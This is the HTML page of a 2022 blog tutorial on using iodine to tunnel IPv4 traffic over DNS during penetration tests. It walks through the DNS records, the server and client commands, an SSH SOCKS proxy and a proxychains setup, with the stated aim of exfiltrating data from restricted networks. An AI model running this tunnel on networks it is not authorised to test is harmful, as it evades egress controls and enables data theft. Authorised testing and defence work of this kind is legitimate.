@@ -1,0 +1,822 @@
+<!DOCTYPE html>
+<html lang="en-us">
+  <head>
+    
+    <script type="application/ld+json">
+
+{  
+  "@context":"http://schema.org",
+  "@type":"Website",
+  "@id":"https:\/\/succurity.com\/",
+  "author": {
+    "@type": "Person",
+    "name": "Sage",
+    
+    "image": "https://succurity.com/images/me.jpg"
+    
+  },
+  "name":"Sage\x27s Succurity Blog",
+  "description":"Sometimes during pentest engagements in restricted networks, we might need access to the internet. Internet access could be used to exfil info or retrieve a tool or script. Because of the state of those networks, no data can leave the network boundry. Security is hard and although the internet can be blocked, DNS is sometimes overlooked and DNS queries could still work. This is were we can use DNS Tunneling to circumvent any blocks that have been put in place.",
+  "url":"https:\/\/succurity.com\/post\/offsec\/dns-tunneling\/",
+  "keywords":"[security]"
+}
+
+</script>
+    <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="generator" content="Hugo 0.68.3 with theme Tranquilpeak 0.5.3-BETA">
+<meta name="author" content="Sage">
+<meta name="keywords" content="security">
+<meta name="description" content="Sometimes during pentest engagements in restricted networks, we might need access to the internet. Internet access could be used to exfil info or retrieve a tool or script. Because of the state of those networks, no data can leave the network boundry. Security is hard and although the internet can be blocked, DNS is sometimes overlooked and DNS queries could still work. This is were we can use DNS Tunneling to circumvent any blocks that have been put in place.">
+
+
+<meta property="og:description" content="Sometimes during pentest engagements in restricted networks, we might need access to the internet. Internet access could be used to exfil info or retrieve a tool or script. Because of the state of those networks, no data can leave the network boundry. Security is hard and although the internet can be blocked, DNS is sometimes overlooked and DNS queries could still work. This is were we can use DNS Tunneling to circumvent any blocks that have been put in place.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DNS Tunneling with Iodine">
+<meta name="twitter:title" content="DNS Tunneling with Iodine">
+<meta property="og:url" content="https://succurity.com/post/offsec/dns-tunneling/">
+<meta property="twitter:url" content="https://succurity.com/post/offsec/dns-tunneling/">
+<meta property="og:site_name" content="Sage&#39;s Succurity Blog">
+<meta property="og:description" content="Sometimes during pentest engagements in restricted networks, we might need access to the internet. Internet access could be used to exfil info or retrieve a tool or script. Because of the state of those networks, no data can leave the network boundry. Security is hard and although the internet can be blocked, DNS is sometimes overlooked and DNS queries could still work. This is were we can use DNS Tunneling to circumvent any blocks that have been put in place.">
+<meta name="twitter:description" content="Sometimes during pentest engagements in restricted networks, we might need access to the internet. Internet access could be used to exfil info or retrieve a tool or script. Because of the state of those networks, no data can leave the network boundry. Security is hard and although the internet can be blocked, DNS is sometimes overlooked and DNS queries could still work. This is were we can use DNS Tunneling to circumvent any blocks that have been put in place.">
+<meta property="og:locale" content="en-us">
+
+  
+    <meta property="article:published_time" content="2022-04-05T15:36:17">
+  
+  
+    <meta property="article:modified_time" content="2022-04-05T15:36:17">
+  
+  
+  
+    
+      <meta property="article:section" content="posts">
+    
+  
+  
+    
+      <meta property="article:tag" content="security">
+    
+      <meta property="article:tag" content="dns tunneling">
+    
+  
+
+
+<meta name="twitter:card" content="summary">
+
+
+
+
+
+
+
+  <meta property="og:image" content="https://succurity.com/images/me.jpg">
+  <meta property="twitter:image" content="https://succurity.com/images/me.jpg">
+
+
+
+
+  <meta property="og:image" content="https://succurity.com/images/tunnel/tunnel-dns.png">
+  <meta property="twitter:image" content="https://succurity.com/images/tunnel/tunnel-dns.png">
+
+
+
+    <title>DNS Tunneling with Iodine</title>
+
+    <link rel="icon" href="https://succurity.com/images/favicon.ico">
+    
+
+    
+
+    <link rel="canonical" href="https://succurity.com/post/offsec/dns-tunneling/">
+
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" integrity="sha512-iBBXm8fW90+nuLcSKlbmrPcLa0OT92xO1BIsZ+ywDWZCvqsWgccV3gFoRBv0z+8dLJgyAHIhR35VZc2oM/gI1w==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.css" integrity="sha512-H9jrZiiopUdsLpg94A333EfumgUBpO9MdbxStdeITo+KEIMaNfHNvwyjjDJb+ERPaRS6DpyRlKbvPUasNItRyw==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+    
+    
+    
+    <link rel="stylesheet" href="https://succurity.com/css/style-h6ccsoet3mzkbb0wngshlfbaweimexgqcxj0h5hu4h82olsdzz6wmqdkajm.min.css" />
+    
+    
+
+    
+      
+    
+    
+  </head>
+
+  <body>
+    <div id="blog">
+      <header id="header" data-behavior="4">
+  <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
+  <div class="header-title">
+    <a class="header-title-link" href="https://succurity.com/" aria-label="Go to homepage">Sage&#39;s Succurity Blog</a>
+  </div>
+  
+    
+      <a class="header-right-picture "
+         href="https://twitter.com/misusage_" target="_blank" rel="noopener" aria-label="Open the link: https://twitter.com/misusage_">
+    
+    
+    
+      
+        <img class="header-picture" src="https://succurity.com/images/me.jpg" alt="Author&#39;s picture" />
+      
+    
+    </a>
+  
+</header>
+
+      <nav id="sidebar" data-behavior="4">
+  <div class="sidebar-container">
+    
+      <div class="sidebar-profile">
+        <a href="https://succurity.com/#about" aria-label="Read more about the author">
+          <img class="sidebar-profile-picture" src="https://succurity.com/images/me.jpg" alt="Author&#39;s picture" />
+        </a>
+        <h4 class="sidebar-profile-name">Sage</h4>
+        
+          <h5 class="sidebar-profile-bio">Succurity through Obscurity usually isn&rsquo;t a good idea.</h5>
+        
+      </div>
+    
+    <ul class="sidebar-buttons">
+      
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://succurity.com/" title="Home">
+    
+      <i class="sidebar-button-icon fas fa-lg fa-home" aria-hidden="true"></i>
+      
+      <span class="sidebar-button-desc">Home</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://succurity.com/categories/write-ups" title="CTF Writeups">
+    
+      <i class="sidebar-button-icon fas fa-lg fa-bookmark" aria-hidden="true"></i>
+      
+      <span class="sidebar-button-desc">CTF Writeups</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://succurity.com/tags" title="Tags">
+    
+      <i class="sidebar-button-icon fas fa-lg fa-tags" aria-hidden="true"></i>
+      
+      <span class="sidebar-button-desc">Tags</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://succurity.com/categories" title="Categories">
+    
+      <i class="sidebar-button-icon fas fa-lg fa-bookmark" aria-hidden="true"></i>
+      
+      <span class="sidebar-button-desc">Categories</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://succurity.com/page/about" title="About Me">
+    
+      <i class="sidebar-button-icon fas fa-lg fa-question" aria-hidden="true"></i>
+      
+      <span class="sidebar-button-desc">About</span>
+    </a>
+  </li>
+
+
+    </ul>
+    <ul class="sidebar-buttons">
+      
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://github.com/silverlak3" target="_blank" rel="noopener" title="GitHub">
+    
+      <i class="sidebar-button-icon fab fa-lg fa-github" aria-hidden="true"></i>
+      
+      <span class="sidebar-button-desc">GitHub</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://www.linkedin.com/in/rafasec/" target="_blank" rel="noopener" title="LinkedIn">
+    
+      <i class="sidebar-button-icon fab fa-lg fa-linkedin" aria-hidden="true"></i>
+      
+      <span class="sidebar-button-desc">LinkedIn</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://twitter.com/misusage_" target="_blank" rel="noopener" title="Twitter">
+    
+      <i class="sidebar-button-icon fab fa-lg fa-twitter" aria-hidden="true"></i>
+      
+      <span class="sidebar-button-desc">Twitter</span>
+    </a>
+  </li>
+
+
+    </ul>
+    <ul class="sidebar-buttons">
+      
+
+    </ul>
+  </div>
+</nav>
+
+      
+  <div class="post-header-cover
+              text-left
+              "
+       style="background-image:url('/images/tunnel/tunnel-dns.png')"
+       data-behavior="4">
+    
+      <div class="post-header main-content-wrap text-left">
+  
+    <h1 class="post-title">
+      DNS Tunneling with Iodine
+    </h1>
+  
+  
+  <div class="postShorten-meta post-meta">
+    
+      <time datetime="2022-04-05T15:36:17-07:00">
+        
+  April 5, 2022
+
+      </time>
+    
+    
+  
+  
+    <span>in</span>
+    
+      <a class="category-link" href="https://succurity.com/categories/posts">posts</a>
+    
+  
+
+  </div>
+
+</div>
+    
+  </div>
+
+
+      <div id="main" data-behavior="4"
+        class="hasCover
+               hasCoverMetaIn
+               ">
+        <article class="post" id="top">
+          
+          
+          <div class="post-content markdown">
+            <div class="main-content-wrap">
+              <p>Sometimes during pentest engagements in restricted networks, we might need access to the internet. Internet access could be used to exfil info or retrieve a tool or script. Because of the state of those networks, no data can leave the network boundry. Security is hard and although the internet can be blocked, DNS is sometimes overlooked and DNS queries could still work. This is were we can use DNS Tunneling to circumvent any blocks that have been put in place.</p>
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<h2 id="how-does-dns-tunneling-work">How does DNS Tunneling work?</h2>
+<!-- raw HTML omitted -->
+<p>Basically, what we want to do is send our IPv4 traffic over DNS packets. Since DNS is allowed to leave our network boundry, we can encode our IPv4 traffic into DNS packets, using the hostname to send data, and use a record type, such as NULL or TXT records, to transport the response. Also, because DNS was not designed to carry internet traffic, don&rsquo;t expect to have blazing fast speeds.</p>
+<p>We will need to have control over a domain and have the ability to create new DNS records. I am using Digital Ocean but feel free to use any cloud provider of your choosing.</p>
+<p>If you&rsquo;d like to support me and don&rsquo;t have a DigiOcean account yet, feel free to use my <a href="https://m.do.co/c/eeee656f58e7">Referral Link</a>. You don&rsquo;t have to use it but you&rsquo;ll get some nice incentives as well.</p>
+<!-- raw HTML omitted -->
+<h2 id="setup">Setup</h2>
+<!-- raw HTML omitted -->
+<p>To start off, you are going to want to have a domain. Feel free to purchase one with Godaddy, namecheap, Google Domains, etc.. I added the domain that I purchased to my DigiOcean account under the Networking &gt; Domains section.</p>
+<p>Create a new linux instance of your choosing in your cloud provider. If you want to do this in DigiOcean, you can create a new droplet, with the following options:</p>
+<ul>
+<li>Distribution: Ubuntu (I am using 20.04 LTS x64)</li>
+<li>Shared CPU, Basic</li>
+<li>CPU options: Regular with SSD, $5/mo option.</li>
+<li>Datacenter Region: any (I am using San Francisco 3)</li>
+<li>Select your SSH key(s) that you&rsquo;ll be using to login with</li>
+<li>Choose a hostname: call it anything you&rsquo;d like</li>
+</ul>
+<p>Assign the droplet to the project and wait a few minutes. Once its up and running, SSH in and lets get to work!</p>
+<!-- raw HTML omitted -->
+<h2 id="how-to-check-if-dns-tunneling-is-possible">How to Check if DNS Tunneling is Possible</h2>
+<!-- raw HTML omitted -->
+<p>If you are on a pentest engagement, and your internet usage is blocked, try issuing out a few DNS queries. If your DNS queries get resolved, it is <em>likely possible</em> that you could DNS tunnel out. <strong>Note: I said <em>likely possible</em> as there are advanced DNS configurations or other restrictions that could prevent this type of connection.</strong></p>
+<p>Using Dig and response:</p>
+<pre><code>#&gt; dig dns.google.com
+
+; &lt;&lt;&gt;&gt; DiG 9.16.1-Ubuntu &lt;&lt;&gt;&gt; dns.google.com
+;; global options: +cmd
+;; Got answer:
+;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 14881
+;; flags: qr rd ra; QUERY: 1, ANSWER: 2, AUTHORITY: 0, ADDITIONAL: 1
+
+;; OPT PSEUDOSECTION:
+; EDNS: version: 0, flags:; udp: 65494
+;; QUESTION SECTION:
+;dns.google.com.			IN	A
+
+;; ANSWER SECTION:
+dns.google.com.		5	IN	A	8.8.8.8
+dns.google.com.		5	IN	A	8.8.4.4
+
+;; Query time: 27 msec
+;; SERVER: 127.0.0.53#53(127.0.0.53)
+;; WHEN: Tue Apr 05 18:08:21 PDT 2022
+;; MSG SIZE  rcvd: 75
+</code></pre><p>Using nslookup and response:</p>
+<pre><code>#&gt; nslookup dns.google.com
+
+Server:		127.0.0.53
+Address:	127.0.0.53#53
+
+Non-authoritative answer:
+Name:	dns.google.com
+Address: 8.8.8.8
+Name:	dns.google.com
+Address: 8.8.4.4
+Name:	dns.google.com
+Address: 2001:4860:4860::8888
+Name:	dns.google.com
+Address: 2001:4860:4860::8844
+</code></pre><p>Using host and response:</p>
+<pre><code>#&gt; host dns.google.com
+
+dns.google.com has address 8.8.4.4
+dns.google.com has address 8.8.8.8
+dns.google.com has IPv6 address 2001:4860:4860::8844
+dns.google.com has IPv6 address 2001:4860:4860::8888
+</code></pre><p>If you get responses as shown above, then try DNS tunneling!</p>
+<!-- raw HTML omitted -->
+<h2 id="installation">Installation</h2>
+<!-- raw HTML omitted -->
+<p>Iodine Github Repo: <a href="https://github.com/yarrick/iodine">here</a></p>
+<p>We will be using iodine for our DNS tunneling. Clone the repo and compile the software.</p>
+<pre><code>#&gt; cd /opt
+#&gt; git clone https://github.com/yarrick/iodine.git
+#&gt; make
+#&gt; make install
+</code></pre><p><em>make</em> compiles the binaries and <em>make install</em> installs <strong>both</strong>, the client and server binaries over to your system directories in <code>/usr/local/sbin/iodine</code> and <code>/usr/local/sbin/iodined</code> respectively.</p>
+<!-- raw HTML omitted -->
+<h2 id="dns-zone-setup">DNS Zone Setup</h2>
+<!-- raw HTML omitted -->
+<p>We need to have two records in our zone for iodine to work. The first one is an A record that points to the server IP. The second is a NS record that points to the subdomain of our iodine server. <code>&lt;domain&gt;</code> is the domain name that you control and <code>&lt;server public ip&gt;</code> is just that, the public IP address of your iodine server.</p>
+<table>
+<thead>
+<tr>
+<th align="center">Type</th>
+<th align="center">Hostname</th>
+<th align="center">Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td align="center">A</td>
+<td align="center">t.&lt;domain&gt;.&lt;tld&gt;</td>
+<td align="center">&lt;server public ip&gt;</td>
+</tr>
+<tr>
+<td align="center">NS</td>
+<td align="center">x1.&lt;domain&gt;.&lt;tld&gt;</td>
+<td align="center">t.&lt;domain&gt;.&lt;tld&gt;</td>
+</tr>
+</tbody>
+</table>
+<p>Iodine recommends using a short name for the subdomain, to keep as much space as possible available for the data traffic. In this particular case, I called it X1.</p>
+<!-- raw HTML omitted -->
+<h2 id="iodine-server-setup">Iodine Server Setup</h2>
+<!-- raw HTML omitted -->
+<p>Now we can start the server. The first argument is an IP address that will be used inside your tunnel, think of it like an internal IP that will be assigned to the iodine server, and is not actively being used. We can use <code>192.168.99.1</code> and the second argument is the hostname you put in for your NS record. The flags are as follows: -f starts the server in the foreground, -c disables checks on each request, and -P is for the server password.</p>
+<p><code>#&gt; iodined -f -c -P SecretPassword123 192.168.99.1 x1.&lt;domain&gt;.&lt;tld&gt;</code></p>
+<p>That&rsquo;s it! Your Iodine server is all setup. Now onto the client setup.</p>
+<!-- raw HTML omitted -->
+<h2 id="iodine-client-setup">Iodine Client Setup</h2>
+<!-- raw HTML omitted -->
+<p>Your Iodine client is basically any machine that you want to tunnel from. On that machine, clone the iodine repo and install the software the same way as before. Remember, the iodine repo contains both the server and the client binaries.</p>
+<p>Once it&rsquo;s installed, run the iodine client. Enter your password you setup before for the -P flag and the hostname of the NS record that you setup prior. Keep everything at their default settings and feel free to experiment with the other flags after you establish a connection.</p>
+<pre><code>#&gt; iodine -f -P SecretPassword123 x1.&lt;domain&gt;.&lt;tld&gt;
+Opened dns0
+Opened IPv4 UDP socket
+Sending DNS queries for x1.&lt;domain&gt;.&lt;tld&gt; to 127.0.0.53
+Autodetecting DNS query type (use -T to override).iodine: Got NOTIMP as reply:
+Using DNS type TXT queries
+Version ok, both using protocol v 0x00000502. You are user #0
+Setting IP of dns0 to 192.168.99.2
+Setting MTU of dns0 to 1130
+Server tunnel IP is 192.168.99.1
+Requesting server address to attempt raw UDP mode (skip with -r)
+Server is at &lt;iodine-server-public IP&gt;, trying raw login: (skip with -r) OK
+Sending raw traffic directly to &lt;iodine-server-public IP&gt;
+Connection setup complete, transmitting data.
+</code></pre><p>Once you get a <em>Connection setup complete, transmitting data</em> message, try pinging the internal IP of the server you setup before. You should get a response if the tunnel connection was established.</p>
+<pre><code>#&gt; ping -c 4 192.168.99.1
+PING 192.168.99.1 (192.168.99.1) 56(84) bytes of data.
+64 bytes from 192.168.99.1: icmp_seq=1 ttl=64 time=26.8 ms
+64 bytes from 192.168.99.1: icmp_seq=2 ttl=64 time=24.0 ms
+64 bytes from 192.168.99.1: icmp_seq=3 ttl=64 time=22.5 ms
+64 bytes from 192.168.99.1: icmp_seq=4 ttl=64 time=26.0 ms
+
+--- 192.168.99.1 ping statistics ---
+</code></pre><p>If you get a ICMP response, then you should have a working DNS tunnel!</p>
+<p>But what if we want to search the web or send other stuff through this tunnel?</p>
+<!-- raw HTML omitted -->
+<h2 id="socks-proxy">SOCKS Proxy</h2>
+<!-- raw HTML omitted -->
+<p>In that case, let&rsquo;s do tunnel-ception and open a SSH connection via our newly created DNS tunnel and use it as a SOCKS proxy. To do so, connect to the local IP of the tunnel server via SSH. In my particular case, my DigiOcean box only accepts SSH connections with certs so I have to add the client&rsquo;s pub key to the server&rsquo;s authorized_keys file prior to establishing the SSH connection. Once you add the key, issue the following command. Feel free to use which ever port you&rsquo;d like.</p>
+<p><code>#&gt; ssh -ND 8080 root@192.168.99.1</code></p>
+<p>The -D flag establishes a dynamic tunnel and -N tells SSH not not execute any commands and only setup SSH for port forwarding. Once you run the command, the ssh connection will seem to hang. This is normal.</p>
+<p>If you run netstat, you will see the new socket open:</p>
+<pre><code>Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name          
+tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      2882/ssh            
+...
+</code></pre><p>You can test the SOCKS Proxy with <code>curl</code>. Run the following command and you&rsquo;ll see your IP has changed:</p>
+<p><code>curl -x socks5h://127.0.0.1:8080 http://httpbin.org/ip</code></p>
+<p><strong>Note: If you do the command <code>socks5://</code> without the h, the name resolution for the cURL command will take place on your client, rather than the server.</strong></p>
+<h3 id="browser-setup">Browser Setup</h3>
+<p>To setup proxying with your browser, go to your network config settings. In firefox, for example, select the <em>Manual proxy configuration</em> under <em>Configure Proxy Acces to the Internet</em> and put <code>127.0.0.1</code> for the SOCKS Host and <code>8080</code> for the Port.</p>
+<p><img src="https://succurity.com/images/tunnel/proxy-settings.png" alt="Proxy Config"></p>
+<p>There you go! You should now be able to navigate the web.</p>
+<!-- raw HTML omitted -->
+<h2 id="proxychains">Proxychains</h2>
+<!-- raw HTML omitted -->
+<p>You can use Proxychains-ng to send commands through the tunnel. Install proxychains if you don&rsquo;t already have it.</p>
+<p><code>#&gt; apt install proxychains4</code></p>
+<p>Then, edit the config file. Uncomment the <em>dynamic_chain</em> line and comment in the <em>strict_chain</em> line. Also at the very end of the file, change the line to <code>socks5 127.0.0.0.1 8080</code> and save the file.</p>
+<p><code>#&gt; vim /etc/proxychains.conf</code></p>
+<p><img src="https://succurity.com/images/tunnel/proxychains.png" alt="Proxy Config"></p>
+<p>Now in your terminal, run proxychains before every command you do! Try the following command with and without proxychains and see the difference in the results.</p>
+<p><code>#&gt; proxychains4 curl http://httpbin.org/ip</code></p>
+<p>Thats it!. Happy hacking :D</p>
+
+              
+
+
+            </div>
+          </div>
+          <div id="post-footer" class="post-footer main-content-wrap">
+            
+              
+                
+                
+                  <div class="post-footer-tags">
+                    <span class="text-color-light text-small">TAGGED IN</span><br/>
+                    
+  <a class="tag tag--primary tag--small" href="https://succurity.com/tags/security/">security</a>
+
+  <a class="tag tag--primary tag--small" href="https://succurity.com/tags/dns-tunneling/">dns tunneling</a>
+
+                  </div>
+                
+              
+            
+            
+<div class="post-actions-wrap">
+  <nav >
+    <ul class="post-actions post-action-nav">
+      
+        <li class="post-action">
+          
+            <a class="post-action-btn btn btn--disabled">
+          
+              <i class="fa fa-angle-left"></i>
+              <span class="hide-xs hide-sm text-small icon-ml">NEXT</span>
+            </a>
+        </li>
+        <li class="post-action">
+          
+            <a class="post-action-btn btn btn--default tooltip--top" href="https://succurity.com/post/offsec/pentesting-field-guide/" data-tooltip="Pentesting Field Guide" aria-label="PREVIOUS: Pentesting Field Guide">
+          
+              <span class="hide-xs hide-sm text-small icon-mr">PREVIOUS</span>
+              <i class="fa fa-angle-right"></i>
+            </a>
+        </li>
+      
+    </ul>
+  </nav>
+<ul class="post-actions post-action-share" >
+  
+    <li class="post-action hide-lg hide-md hide-sm">
+      <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions" aria-label="Share this post">
+        <i class="fa fa-share-alt" aria-hidden="true"></i>
+      </a>
+    </li>
+    
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://succurity.com/post/offsec/dns-tunneling/" title="Share on Facebook" aria-label="Share on Facebook">
+          <i class="fab fa-facebook-square" aria-hidden="true"></i>
+        </a>
+      </li>
+    
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https://succurity.com/post/offsec/dns-tunneling/" title="Share on Twitter" aria-label="Share on Twitter">
+          <i class="fab fa-twitter" aria-hidden="true"></i>
+        </a>
+      </li>
+    
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://wa.me/?text=https://succurity.com/post/offsec/dns-tunneling/" title="Share on Whatsapp" aria-label="Share on Whatsapp">
+          <i class="fab fa-whatsapp" aria-hidden="true"></i>
+        </a>
+      </li>
+    
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://www.linkedin.com/sharing/share-offsite/?url=https://succurity.com/post/offsec/dns-tunneling/" title="Share on Linkedin" aria-label="Share on Linkedin">
+          <i class="fab fa-linkedin" aria-hidden="true"></i>
+        </a>
+      </li>
+    
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://news.ycombinator.com/submitlink?u=https://succurity.com/post/offsec/dns-tunneling/" title="Share on Hacker News" aria-label="Share on Hacker News">
+          <i class="fab fa-hacker-news" aria-hidden="true"></i>
+        </a>
+      </li>
+    
+  
+  
+  <li class="post-action">
+    
+      <a class="post-action-btn btn btn--default" href="#top" aria-label="Back to top">
+      <i class="fa fa-arrow-up" aria-hidden="true"></i>
+    
+    </a>
+  </li>
+</ul>
+</div>
+
+
+            
+  
+    <div id="disqus_thread">
+      <noscript>Please enable JavaScript to view the comments powered by Disqus.</noscript>
+    </div>
+    <script type="text/javascript">
+      var disqus_config = function() {
+        this.page.url = 'https:\/\/succurity.com\/post\/offsec\/dns-tunneling\/';
+        
+          this.page.identifier = '\/post\/offsec\/dns-tunneling\/'
+        
+      };
+      (function() {
+        
+        
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+          document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+          return;
+        }
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        var disqus_shortname = '';
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+      })();
+    </script>
+  
+
+
+          </div>
+        </article>
+        <footer id="footer" class="main-content-wrap">
+  <span class="copyrights">
+    &copy; 2022 <a href="https://twitter.com/misusage_">Sage</a>. Made with <3. All Rights Reserved
+  </span>
+</footer>
+
+      </div>
+      <div id="bottom-bar" class="post-bottom-bar" data-behavior="4">
+        
+<div class="post-actions-wrap">
+  <nav >
+    <ul class="post-actions post-action-nav">
+      
+        <li class="post-action">
+          
+            <a class="post-action-btn btn btn--disabled">
+          
+              <i class="fa fa-angle-left"></i>
+              <span class="hide-xs hide-sm text-small icon-ml">NEXT</span>
+            </a>
+        </li>
+        <li class="post-action">
+          
+            <a class="post-action-btn btn btn--default tooltip--top" href="https://succurity.com/post/offsec/pentesting-field-guide/" data-tooltip="Pentesting Field Guide" aria-label="PREVIOUS: Pentesting Field Guide">
+          
+              <span class="hide-xs hide-sm text-small icon-mr">PREVIOUS</span>
+              <i class="fa fa-angle-right"></i>
+            </a>
+        </li>
+      
+    </ul>
+  </nav>
+<ul class="post-actions post-action-share" >
+  
+    <li class="post-action hide-lg hide-md hide-sm">
+      <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions" aria-label="Share this post">
+        <i class="fa fa-share-alt" aria-hidden="true"></i>
+      </a>
+    </li>
+    
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://succurity.com/post/offsec/dns-tunneling/" title="Share on Facebook" aria-label="Share on Facebook">
+          <i class="fab fa-facebook-square" aria-hidden="true"></i>
+        </a>
+      </li>
+    
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https://succurity.com/post/offsec/dns-tunneling/" title="Share on Twitter" aria-label="Share on Twitter">
+          <i class="fab fa-twitter" aria-hidden="true"></i>
+        </a>
+      </li>
+    
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://wa.me/?text=https://succurity.com/post/offsec/dns-tunneling/" title="Share on Whatsapp" aria-label="Share on Whatsapp">
+          <i class="fab fa-whatsapp" aria-hidden="true"></i>
+        </a>
+      </li>
+    
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://www.linkedin.com/sharing/share-offsite/?url=https://succurity.com/post/offsec/dns-tunneling/" title="Share on Linkedin" aria-label="Share on Linkedin">
+          <i class="fab fa-linkedin" aria-hidden="true"></i>
+        </a>
+      </li>
+    
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://news.ycombinator.com/submitlink?u=https://succurity.com/post/offsec/dns-tunneling/" title="Share on Hacker News" aria-label="Share on Hacker News">
+          <i class="fab fa-hacker-news" aria-hidden="true"></i>
+        </a>
+      </li>
+    
+  
+  
+  <li class="post-action">
+    
+      <a class="post-action-btn btn btn--default" href="#top" aria-label="Back to top">
+      <i class="fa fa-arrow-up" aria-hidden="true"></i>
+    
+    </a>
+  </li>
+</ul>
+</div>
+
+
+      </div>
+      
+<div id="share-options-bar" class="share-options-bar" data-behavior="4">
+  <i id="btn-close-shareoptions" class="fa fa-times"></i>
+  <ul class="share-options">
+    
+      <li class="share-option">
+        <a class="share-option-btn" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fsuccurity.com%2Fpost%2Foffsec%2Fdns-tunneling%2F" aria-label="Share on Facebook">
+          <i class="fab fa-facebook-square" aria-hidden="true"></i><span>Share on Facebook</span>
+        </a>
+      </li>
+    
+      <li class="share-option">
+        <a class="share-option-btn" target="new" href="https://twitter.com/intent/tweet?text=https%3A%2F%2Fsuccurity.com%2Fpost%2Foffsec%2Fdns-tunneling%2F" aria-label="Share on Twitter">
+          <i class="fab fa-twitter" aria-hidden="true"></i><span>Share on Twitter</span>
+        </a>
+      </li>
+    
+      <li class="share-option">
+        <a class="share-option-btn" target="new" href="https://wa.me/?text=https%3A%2F%2Fsuccurity.com%2Fpost%2Foffsec%2Fdns-tunneling%2F" aria-label="Share on Whatsapp">
+          <i class="fab fa-whatsapp" aria-hidden="true"></i><span>Share on Whatsapp</span>
+        </a>
+      </li>
+    
+      <li class="share-option">
+        <a class="share-option-btn" target="new" href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fsuccurity.com%2Fpost%2Foffsec%2Fdns-tunneling%2F" aria-label="Share on Linkedin">
+          <i class="fab fa-linkedin" aria-hidden="true"></i><span>Share on Linkedin</span>
+        </a>
+      </li>
+    
+      <li class="share-option">
+        <a class="share-option-btn" target="new" href="https://news.ycombinator.com/submitlink?u=https%3A%2F%2Fsuccurity.com%2Fpost%2Foffsec%2Fdns-tunneling%2F" aria-label="Share on Hacker News">
+          <i class="fab fa-hacker-news" aria-hidden="true"></i><span>Share on Hacker News</span>
+        </a>
+      </li>
+    
+  </ul>
+</div>
+<div id="share-options-mask" class="share-options-mask"></div>
+
+
+    </div>
+    
+    <div id="about">
+  <div id="about-card">
+    <div id="about-btn-close">
+      <i class="fa fa-times"></i>
+    </div>
+    
+      <img id="about-card-picture" src="https://succurity.com/images/me.jpg" alt="Author&#39;s picture" />
+    
+    <h4 id="about-card-name">Sage</h4>
+    
+      <div id="about-card-bio">Succurity through Obscurity usually isn&rsquo;t a good idea.</div>
+    
+    
+      <div id="about-card-job">
+        <i class="fa fa-briefcase"></i>
+        <br/>
+        Offensive Security
+      </div>
+    
+    
+      <div id="about-card-location">
+        <i class="fa fa-map-marker-alt"></i>
+        <br/>
+        California, US
+      </div>
+    
+  </div>
+</div>
+
+    
+
+    
+  
+    
+      
+      <div id="cover" style="background-image:url('https://succurity.com/images/cover.jpg');"></div>
+    
+  
+
+
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" integrity="sha512-894YE6QWD5I59HgZOGReFYm4dnWc1Qt5NtvYSaNcOP+u1T9qYdvdihz0PPSiiqn/+/3e7Jo4EaG7TubfWGUrMQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+
